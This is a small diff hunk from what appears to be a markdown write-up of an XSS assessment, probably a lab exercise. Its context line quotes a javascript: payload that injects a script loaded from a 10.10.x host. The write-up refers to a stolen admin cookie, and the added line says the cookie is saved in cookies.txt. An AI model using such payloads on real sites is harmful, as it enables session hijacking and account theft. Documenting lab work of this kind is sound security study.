@@ -227,5 +227,4 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.1
 
 ![xss-assessmennt-admin-cookie-stolen](/images/xss-assessmennt-admin-cookie-stolen.png)  
 
-
-
+>Results of the stolen cookie is stored in the file `cat cookies.txt`.  
